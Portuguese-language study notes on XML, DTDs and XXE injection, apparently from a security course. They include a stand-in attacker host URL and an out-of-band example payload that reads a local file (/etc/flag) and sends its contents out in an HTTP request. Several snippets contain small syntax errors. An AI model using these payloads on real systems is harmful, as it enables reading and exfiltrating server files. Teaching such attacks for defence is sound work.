# Ataques

## XML External Entities Injection (XXE Injection)
Esse tipo de ataque se aproveita do processamento de dados XML da aplicação. Ou seja, o atacante envia um PAYLOAD que é tratado pelo XML Parser que não é tratado da forma que deveria.

Mas o que é XML? 

### Extensible Markup Language (XML)
Serve para armazenamento e transporte de dados (como o JSON) mas utiliza tags (como o HTML). Exemplo:
```
<?xml version="1.0" enconding="UTF-8"?>
<msg lang="pt-br" category="web">
    <from> Ganeshers </from>
    <to> All </to>
    <title> PING 2020 </title>
    <body>Exemplo de XML </body>
</msg>
```
Mas diferente do HTML, o XML não tem tags padrões. A pessoa que o utiliza escolhe os nomes das tags e dos atributos.

Além disso, o XML possui o Document Type Definition (DTD) que define como o XML será estruturado. Isso é dentro do elemento DOCTYPE interna (dentro do XML) ou externa (em outro arquivo). Exemplo (interno):
```
<?xml version="1.0" enconding="UTF-8"?>
<!DOCTYPE doctype_name[
    <!-----ELEMENT [nome da tag] [conteudo que ficará dentro da tag]----->
    <!ELEMENT elem1 (elem2, elem3)> <!-------Dentro dere ficará dois elementos, elem1 e elem2----->
    <!ELEMENT elem2 (#PCDATA)> <!-------O conteúdo é um texto-----> 
    <!ELEMENT elem3 (#PCDATA)>
]>
<elem1>
    <elem2> Dados do elem2 </elem2>
    <elem3> Dados do elem3 </elem3>
<elem1>
```
Além de definir elementos, o DTD define entidades. As entidades representam itens do documento XML sem usar seus dados diretamente. Existem entidades especificas do XML (padrões):
- &lt (<)  
- &gt (>)    

Ou entidades customizadas que são criadas dentro do DTD. Exemplo:
```
<?xml version="1.0" enconding="UTF-8"?>
<!DOCTYPE doctype_name[ <!ENTITY texto "Hello World"> ]>
<!----É como se texto fosse uma variavel com "Hello World" dentro---->
<tag> &lt;&texto;&gt; </tag>
```
Quando isso fosse lido pelo XML Parser, o &texto; seria substituido pelo texto "Hello World" e as entidades padrões seriam substituidas também, ficando com:
```
<tag> <Hello World> <tag>
```
As entidades podem ser definidas no documento XML (DTD) ou externamente ao documento XML (buscado fora do DTD). Esse tipo de entidade vem com a palavra-chave SYSTEM +URL que contém a definição.
```
!<!DOCTYPE doctype_name [ <!ENTITY entity_name SYSTEM "http://website.com> ]>

<!DOCTYPE foo [ <!ENTITY entity_name SYSTEM "file:///path/to/file> ]>

<!---Essa entidade entity_name vale o que quer que esteja dentro desse caminho passado--->
```

### Voltando ao ataque
Consiste em injetar entidades em um XML que geram um comportamento incorreto.

[Fluxo do XXL](./aula04/xxe-flow.png)

É feito um POST com um XXE Data, ou seja, um arquivo XML com uma entidade definida externamente.
```
<!DOCTYPE [ ext SYSTEM "https://evil-webserver.com/payload.dtd ]>  
```
O servidor busca externamente esse payload.dtd. Mas dentro desse dtd ele busca uma informação sigilosa. Por fim, o payload.dtd também faz uma busca por uma entidade externa, e o conteúdo da entidade com dados sigilosas é enviado dentro da URL da requisição GET.

Então, exemplo:
Temos um código que possui um XML Parser. Então, enviamos um conteúdo para esse XML Parser que possui uma entidade externa definida, como
```
<?xml version="1.0" enconding="UTF-8"?>
<!DOCTYPE data SYSTEM "http://localhost:8080/host.did">
<data>
    &send;
</data>
```
Esse XML que vamos enviar para o XML Parser faz uma busca a uma entidade externa, nesse exemplo, para o caminho `http://localhost:8080/host.did`.  
Por sua vez, esse caminho devolve o seguinte conteúdo:
```
<!ENTITY % file SYSTEM "file://etc/flag">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://localhost:8080/recebe-dado-sigiloso/%file';>">
```
Esse código será injetado no XML Parser que por sua vez vai buscar um arquivo localmente no servidor `file://etc/flag` e em seguida enviar por meio de outra entidade para `http://localhost:8080/recebe-dado-sigiloso` um parametro que contém o valor da entidade file, que era o conteúdo do arquivo `/etc/flag`.
